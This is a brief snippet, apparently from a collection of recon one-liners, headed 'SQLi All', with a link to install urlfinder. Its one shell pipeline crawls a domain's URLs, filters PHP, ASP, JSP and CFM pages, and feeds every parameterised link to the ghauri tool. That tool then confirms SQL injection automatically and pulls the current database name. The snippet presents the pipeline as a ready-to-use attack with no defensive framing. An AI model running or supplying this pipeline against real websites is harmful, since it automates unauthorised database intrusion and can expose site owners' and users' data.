### SQLi All
```
urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --random-agent --confirm --force-ssl --level=3 --current-db --batch
```
<p>install <a href="https://github.com/projectdiscovery/urlfinder" target="_blank">urlfinder</a></p>
